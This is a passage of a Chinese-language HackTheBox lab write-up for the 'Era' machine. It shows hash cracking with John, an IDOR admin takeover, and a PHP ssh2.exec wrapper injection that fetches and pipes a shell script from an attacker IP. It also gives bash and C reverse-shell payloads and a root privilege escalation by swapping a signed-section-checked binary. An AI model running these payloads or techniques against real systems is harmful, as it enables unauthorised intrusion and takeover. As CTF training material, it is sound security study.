s=\"hljs-built_in\"\u003ecat\u003c/span\u003e raw | awk -F \u003cspan class=\"hljs-string\"\u003e'|'\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e'{print $2\":\"$3}'\u003c/span\u003e \u003e \u003cspan class=\"hljs-built_in\"\u003ehash\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e进行爆破\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  Era john --wordlist=/usr/share/wordlists/rockyou.txt \u003cspan class=\"hljs-built_in\"\u003ehash\u003c/span\u003e\nUsing default input encoding: UTF-8\nLoaded 6 password hashes with 6 different salts (bcrypt [Blowfish 32/64 X3])\nLoaded hashes with cost 1 (iteration count) varying from 1024 to 4096\nWill run 8 OpenMP threads\nPress \u003cspan class=\"hljs-string\"\u003e'q'\u003c/span\u003e or Ctrl-C to abort, almost any other key \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e status\namerica          (eric)     \nmustang          (yuri) \n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e拿到凭据后去测试 \u003ccode\u003eFTP\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e最后使用 \u003ccode\u003eyuri\u003c/code\u003e 的账户能成功进入\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  Era ftp yuri@10.10.11.79\nConnected to 10.10.11.79.\n220 (vsFTPd 3.0.5)\n331 Please specify the password.\nPassword: \n230 Login successful.\nRemote system \u003cspan class=\"hljs-built_in\"\u003etype\u003c/span\u003e is UNIX.\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e能扒拉出不少文件\u003c/p\u003e\n\u003ch2\u003e代码审计\u003c/h2\u003e\n\u003cp\u003e在 \u003ccode\u003edownload.php\u003c/code\u003e 中，我们可以发现一段注释写着”目前仅供管理员使用”\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxSeason8%20-%20Era/image6.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e这里使用\u003ccode\u003eAI\u003c/code\u003e 进行分析：\u003c/p\u003e\n\u003cp\u003e这部分代码包含一个典型且极其严重的安全漏洞。这是一个 PHP 流封装协议注入（PHP Stream Wrapper Injection）漏洞：\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003e\n\u003cp\u003e攻击者通过 URL 完全控制 \u003ccode\u003eformat\u003c/code\u003e 参数\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e代码检查 \u003ccode\u003eformat\u003c/code\u003e 是否包含 \u003ccode\u003e://\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e然而，它非但没有阻止这个输入，反而将用户提供的整个字符串赋值给了 \u003ccode\u003e$wrapper\u003c/code\u003e 变量。这是致命的缺陷。 开发者的本意可能并非如此，但实现方式导致了漏洞\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e用户可控的 \u003ccode\u003e$wrapper\u003c/code\u003e 被直接拼接到文件名 \u003ccode\u003e$file\u003c/code\u003e 的前面，然后这个结果被传递给了 \u003ccode\u003efopen()\u003c/code\u003e 函数。PHP 中的 \u003ccode\u003efopen()\u003c/code\u003e 函数功能异常强大，因为它能理解“PHP 流封装协议（Stream Wrappers）”\u003c/p\u003e\n\u003c/li\u003e\n\u003c/ol\u003e\n\u003cp\u003e但是我们测试这个漏洞的前提是我们得先拥有管理员后台\u003c/p\u003e\n\u003ch2\u003eIDOR\u003c/h2\u003e\n\u003cp\u003e我们回到后台中，因为我们知道了管理员账户的用户名\u003c/p\u003e\n\u003cp\u003e我们尝试在随意一个用户的后台中更新管理账户的安全问题\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxSeason8%20-%20Era/image7.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e点击 \u003ccode\u003eupdate\u003c/code\u003e 竟然提示更新成功了\u003c/p\u003e\n\u003cp\u003e然后我们来到主页点击使用 “\u003ccode\u003eLogin using security questions\u003c/code\u003e”\u003c/p\u003e\n\u003cp\u003e输入刚刚更新问题就能进入管理员的后台\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxSeason8%20-%20Era/image8.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003ch2\u003e验证漏洞\u003c/h2\u003e\n\u003cp\u003e首先漏洞要满足条件，\u003ccode\u003eID\u003c/code\u003e 是数字并且是存在的，并且\u003ccode\u003eshow\u003c/code\u003e 为 \u003ccode\u003etrue\u003c/code\u003e ，使用管理员账户进行登录\u003c/p\u003e\n\u003cp\u003e但是下载文件时会将 \u003ccode\u003eID\u003c/code\u003e 的文件名拼接上去\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e\u003cspan class=\"hljs-variable\"\u003e$file_content\u003c/span\u003e = fopen(\u003cspan class=\"hljs-variable\"\u003e$wrapper\u003c/span\u003e ? \u003cspan class=\"hljs-variable\"\u003e$wrapper\u003c/span\u003e . \u003cspan class=\"hljs-variable\"\u003e$file\u003c/span\u003e : \u003cspan class=\"hljs-variable\"\u003e$file\u003c/span\u003e, \u003cspan class=\"hljs-string\"\u003e'r'\u003c/span\u003e);\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e假如我们输入 \u003ccode\u003ephp://filter/read=convert.base64-encode/resource=/etc/passwd\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e就会变成 \u003ccode\u003ephp://filter/read=convert.base64-encode/resource=/etc/passwdfiles/xxx\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxSeason8%20-%20Era/image9.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e这里我尝试了一下无法进行 \u003ccode\u003eLFI\u003c/code\u003e ，也可能是没有回显\u003c/p\u003e\n\u003cp\u003e找到一个 \u003ccode\u003ePHP\u003c/code\u003e 的\u003ccode\u003eSSH\u003c/code\u003e \u003ccode\u003eWarppers\u003c/code\u003e\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp\u003e\u003ca href=\"https://www.php.net/manual/en/wrappers.ssh2.php\"\u003ehttps://www.php.net/manual/en/wrappers.ssh2.php\u003c/a\u003e\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp\u003e我们可以尝试使用上面的得到的用户进行尝试\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003essh2.exec://yuri:mustang@127.0.0.1:22/curl+\u0026#x3C;Your IP\u003e/\nssh2.exec://eric:america@127.0.0.1:22/curl+\u0026#x3C;Your IP\u003e/\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e使用 \u003ccode\u003eeric:america\u003c/code\u003e 的凭据可以成功执行 \u003ccode\u003eSSRF\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxSeason8%20-%20Era/image10.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e我们写一个反弹 \u003ccode\u003eshell\u003c/code\u003e 脚本然后让它读取然后执行\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e\u003cspan class=\"hljs-comment\"\u003e# shell.sh\u003c/span\u003e\n/bin/bash -c \u003cspan class=\"hljs-string\"\u003e'bash -i \u003e\u0026#x26; /dev/tcp/\u0026#x3C;Your IP\u003e/1234 0\u003e\u0026#x26;1'\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e开启服务器，在 \u003ccode\u003eURL\u003c/code\u003e 上输入如下命令\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003essh2.exec://eric:america@127.0.0.1:22/curl+\u0026#x3C;Your IP\u003e/shell.sh+|bash;\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e成功接收到 \u003ccode\u003eshell\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxSeason8%20-%20Era/image11.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e该用户可以读取 \u003ccode\u003euser.txt\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003eeric@era:~$ \u003cspan class=\"hljs-built_in\"\u003ecat\u003c/span\u003e user.txt \nd06xxxxxxxxxxxxxxxxxxxxxxxx\n\u003c/code\u003e\u003c/pre\u003e\n\u003ch2\u003e权限提升\u003c/h2\u003e\n\u003cp\u003e上边 \u003ccode\u003eid\u003c/code\u003e 的时候能注意到我们属于 \u003ccode\u003edevs\u003c/code\u003e组\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003eeric@era:~$ \u003cspan class=\"hljs-built_in\"\u003eid\u003c/span\u003e\nuid=1000(eric) gid=1000(eric) \u003cspan class=\"hljs-built_in\"\u003egroups\u003c/span\u003e=1000(eric),1001(devs)\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003ccode\u003eLinpeas\u003c/code\u003e 枚举，有几个 \u003ccode\u003edevs\u003c/code\u003e 组可以读取的文件\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e1220  ╔══════════╣ Readable files belonging to root and readable by me but not world readable \n  1221  -rw-r----- 1 root eric 33 Jul 29 03:11 /home/eric/user.txt                              \n  1222  -rwxrw---- 1 root devs 16544 Jul 29 04:07 /opt/AV/periodic-checks/monitor               \n  1223  -rw-rw---- 1 root devs 205 Jul 29 04:07 /opt/AV/periodic-checks/status.log\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e文件夹信息\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003eeric@era:/opt/AV/periodic-checks$ \u003cspan class=\"hljs-built_in\"\u003els\u003c/span\u003e -la\ntotal 32\ndrwxrwxr-- 2 root devs  4096 Jul 29 04:53 .\ndrwxrwxr-- 3 root devs  4096 Jul 22 08:42 ..\n-rwxrw---- 1 root devs 16544 Jul 29 04:53 monitor\n-rw-rw---- 1 root devs   307 Jul 29 04:53 status.log\n\neric@era:/opt/AV$ \u003cspan class=\"hljs-built_in\"\u003els\u003c/span\u003e -al\ntotal 12\ndrwxrwxr-- 3 root devs 4096 Jul 22 08:42 .\ndrwxrwxr-x 3 root root 4096 Jul 22 08:42 ..\ndrwxrwxr-- 2 root devs 4096 Jul 29 04:54 periodic-checks\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e名字是 \u003ccode\u003eperiodic-checks\u003c/code\u003e 定期检查，上传 \u003ccode\u003epspy\u003c/code\u003e 看看\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxSeason8%20-%20Era/image12.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e能看到有定时任务在执行，并且会使用 \u003ccode\u003eobjcopy\u003c/code\u003e 从 \u003ccode\u003e/opt/AV/periodic-checks/monitor\u003c/code\u003e 这个可执行文件中，提取一个名为 \u003ccode\u003e.text_sig\u003c/code\u003e 的区段（section），并将其内容转储到一个名为 \u003ccode\u003etext_sig_section.bin\u003c/code\u003e 的新文件中\u003c/p\u003e\n\u003cp\u003e\u003ccode\u003emonitor\u003c/code\u003e 可执行文件很简单\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxSeason8%20-%20Era/image13.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e并且我们对其有权限，我们可以替换它\u003c/p\u003e\n\u003cp\u003e首先写一个反弹 \u003ccode\u003eshell\u003c/code\u003e 功能的 \u003ccode\u003eC\u003c/code\u003e 语言文件\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e\u003cspan class=\"hljs-comment\"\u003e#include \u0026#x3C;stdlib.h\u003e\u003c/span\u003e\n\nint \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-title\"\u003emain\u003c/span\u003e\u003c/span\u003e() {\n    system(\u003cspan class=\"hljs-string\"\u003e\"/bin/bash -c 'bash -i \u003e\u0026#x26; /dev/tcp/\u0026#x3C;Your IP\u003e/4444 0\u003e\u0026#x26;1'\"\u003c/span\u003e);\n    \u003cspan class=\"hljs-built_in\"\u003ereturn\u003c/span\u003e 0;\n}\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e生成 \u003ccode\u003eELF\u003c/code\u003e 文件\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003eeric@era:/tmp$ gcc -o shell shell.c \n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e替换文件\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003eeric@era:/tmp$ \u003cspan class=\"hljs-built_in\"\u003ecp\u003c/span\u003e \u003cspan class=\"hljs-built_in\"\u003ebg\u003c/span\u003e /opt/AV/periodic-checks/monitor\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e我们观察 \u003ccode\u003epspy\u003c/code\u003e 和 监听的端口，但是 \u003ccode\u003epspy\u003c/code\u003e 上显示执行后，并没有将 \u003ccode\u003eshell\u003c/code\u003e 弹过来\u003c/p\u003e\n\u003cp\u003e可能是脚本中处理或需要验证\u003ccode\u003e.text_sig\u003c/code\u003e 字段，所以尝试将原本的\u003ccode\u003emonitor\u003c/code\u003e中的\u003ccode\u003e.text_sig\u003c/code\u003e 复制到我们的 \u003ccode\u003eshell\u003c/code\u003e 中\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003ereadelf -S monitor\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxSeason8%20-%20Era/image14.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e我们将原本的 \u003ccode\u003emonitor\u003c/code\u003e 的 \u003ccode\u003e.text_sig dump\u003c/code\u003e 下来\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  Era objcopy --dump-section .text_sig=sig monitor\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e再添加到我们的 \u003ccode\u003eshell\u003c/code\u003e 上边\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  Era objcopy --add-section .text_sig=sig shell\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e这里可以运行 \u003ccode\u003ereadelf\u003c/code\u003e 查看是否添加了上去\u003c/p\u003e\n\u003cp\u003e然后我们再使用 \u003ccode\u003eshell\u003c/code\u003e 替换掉 \u003ccode\u003emonitor\u003c/code\u003e 即可\u003c/p\u003e\n\u003cp\u003e等待运行即可将 \u003ccode\u003eshell\u003c/code\u003e 弹回来\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxSeason8%20-%20Era/images15.jpg\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003ch2\u003e总结\u003c/h2\u003e\n\u003cp\u003e没耐心，没耐心，不知道为什么在 web 模块的时候就是没有耐心\u003c/p\u003e\n\u003cp\u003e代码审计一开始就只看了 upload 和 数据库文件，并没有看 donwload，所以错过了\u003c/p\u003e\n\u003cp\u003e这是检查的脚本，只是用 \u003ccode\u003egrep\u003c/code\u003e 来检查\u003ccode\u003e.text_sig\u003c/code\u003e  是否存在某些字符串\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e\u003cspan class=\"hljs-meta\"\u003e#!/bin/bash\u003c/span\u003e\n\n\u003cspan class=\"hljs-comment\"\u003e# Paths\u003c/span\u003e\nBINARY=\u003cspan class=\"hljs-string\"\u003e\"/opt/AV/periodic-checks/monitor\"\u003c/span\u003e\nSECTION=\u003cspan class=\"hljs-string\"\u003e\".text_sig\"\u003c/span\u003e\nEXTRACTED_SECTION=\u003cspan class=\"hljs-string\"\u003e\"text_sig_section.bin\"\u003c/span\u003e\nORGANIZATION=\u003cspan class=\"hljs-string\"\u003e\"Era Inc.\"\u003c/span\u003e\nEMAIL=\u003cspan class=\"hljs-string\"\u003e\"yurivich@era.com\"\u003c/span\u003e\n\n\u003cspan class=\"hljs-comment\"\u003e# Extract the .text_sig section\u003c/span\u003e\nobjcopy --dump-section \u003cspan class=\"hljs-string\"\u003e\"\u003cspan class=\"hljs-variable\"\u003e$SECTION\u003c/span\u003e\"\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"\u003cspan class=\"hljs-variable\"\u003e$EXTRACTED_SECTION\u003c/span\u003e\"\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e\"\u003cspan class=\"hljs-variable\"\u003e$BINARY\u003c/span\u003e\"\u003c/span\u003e\n\n\u003cspan class=\"hljs-comment\"\u003e# Parse the ASN.1 structure\u003c/span\u003e\nOUTPUT=$(openssl asn1parse -inform DER -\u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e\"\u003cspan class=\"hljs-variable\"\u003e$EXTRACTED_SECTION\u003c/span\u003e\"\u003c/span\u003e 2\u003e/dev/null)\n\n\u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e [[ $? -ne 0 ]]; \u003cspan class=\"hljs-keyword\"\u003ethen\u003c/span\u003e\n    \u003cspan class=\"hljs-built_in\"\u003eecho\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e\"[ERROR] Executable not signed. Tampering attempt detected. Skipping.\"\u003c/span\u003e\n    \u003cspan class=\"hljs-built_in\"\u003erm\u003c/span\u003e -f \u003cspan class=\"hljs-string\"\u003e\"\u003cspan class=\"hljs-variable\"\u003e$EXTRACTED_SECTION\u003c/span\u003e\"\u003c/span\u003e\n    \u003cspan class=\"hljs-built_in\"\u003eexit\u003c/span\u003e 1\n\u003cspan class=\"hljs-keyword\"\u003efi\u003c/span\u003e\n\n\u003cspan class=\"hljs-comment\"\u003e# Check for the organization name\u003c/span\u003e\nORG_CHECK=$(\u003cspan class=\"hljs-built_in\"\u003eecho\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e\"\u003cspan class=\"hljs-variable\"\u003e$OUTPUT\u003c/span\u003e\"\u003c/span\u003e | grep -oP \u003cspan class=\"hljs-string\"\u003e\"(?\u0026#x3C;=UTF8STRING        :)\u003cspan class=\"hljs-variable\"\u003e$ORGANIZATION\u003c/span\u003e\"\u003c/span\u003e)\n\n\u003cspan class=\"hljs-comment\"\u003e# Check for the email address\u003c/span\u003e\nEMAIL_CHECK=$(\u003cspan class=\"hljs-built_in\"\u003eecho\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e\"\u003cspan class=\"hljs-variable\"\u003e$OUTPUT\u003c/span\u003e\"\u003c/span\u003e | grep -oP \u003cspan class=\"hljs-string\"\u003e\"(?\u0026#x3C;=IA5STRING         :)\u003cspan class=\"hljs-variable\"\u003e$EMAIL\u003c/span\u003e\"\u003c/span\u003e)\n\n\u003cspan class=\"hljs-comment\"\u003e# Decision logic\u003c/span\u003e\n\u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e [[ \u003cspan class=\"hljs-string\"\u003e\"\u003cspan class=\"hljs-variable\"\u003e$ORG_CHECK\u003c/span\u003e\"\u003c/span\u003e == \u003cspan class=\"hljs-string\"\u003e\"\u003cspan class=\"hljs-variable\"\u003e$ORGANIZATION\u003c/span\u003e\"\u003c/span\u003e \u0026#x26;\u0026#x26; \u003cspan class=\"hljs-string\"\u003e\"\u003cspan class=\"hljs-variable\"\u003e$EMAIL_CHECK\u003c/span\u003e\"\u003c/span\u003e == \u003cspan class=\"hljs-string\"\u003e\"\u003cspan class=\"hljs-variable\"\u003e$EMAIL\u003c/span\u003e\"\u003c/span\u003e ]]; \u003cspan class=\"hljs-keyword\"\u003ethen\u003c/span\u003e\n    \u003cspan class=\"hljs-variable\"\u003e$BINARY\u003c/span\u003e\n    \u003cspan class=\"hljs-built_in\"\u003eecho\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e\"[SUCCESS] No threats detected.\"\u003c/span\u003e\n    ALLOW=1\n\u003cspan class=\"hljs-keyword\"\u003eelse\u003c/span\u003e\n    \u003cspan class=\"hljs-built_in\"\u003eecho\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e\"[FAILURE] Binary has been tampered with. Skipping.\"\u003c/span\u003e\n    ALLOW=0\n\u003cspan class=\"hljs-keyword\"\u003efi\u003c/span\u003e\n\n\u003cspan class=\"hljs-comment\"\u003e# Cleanup\u003c/span\u003e\n\u003cspan class=\"hljs-built_in\"\u003erm\u003c/span\u003e -f \u003cspan class=\"hljs-string\"\u003e\"\u003cspan class=\"hljs-variable\"\u003e$EXTRACTED_SECTION\u003c/span\u003e\"\u003c/span\u003e\n\n\u003cspan class=\"hljs-comment\"\u003e# Exit with appropriate status\u003c/span\u003e\n\u003cspan class=\"hljs-built_in\"\u003eexit\u003c/span\u003e \u003cspan class=\"hljs-variable\"\u003e$ALLOW\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e","title":"HackTheBox - Season8 - Era","date":"2025-07-29","updated":"2025-07-29","tags":["HackTheBox","IDOR","Code","PHP_Warrpers","php_ssh2","Hijack","encrypt"],"categories":"靶机","comments":true,"description":"Season8 - Era\n\n https://app.hackthebox.com/machines/Era | `Linux` | `Medium`\n \n\nRecon\n\n\n\nPortScan\n\n\n\n\n\n枚举\n\nFTP 匿名测试\n\n\n\n`HTTP` 服务\n\n\n\n主页中没发现什么信息，爆破一下子域名\n\n\n\n访问 `file.era.htb`\n\n\n\n只有登录页但是没找到注册页面，进行目录爆破\n\n\n\n...","isEncrypted":true}},"__N_SSG":true},"page":"/posts/[id]","query":{"id":"HackTheBoxSeason8 - Era"},"buildId":"Jqp0CuYHU7NHjkZa1PC_l","isFallback":false,"gsp":true,"scriptLoader":[]}</script></body></html>
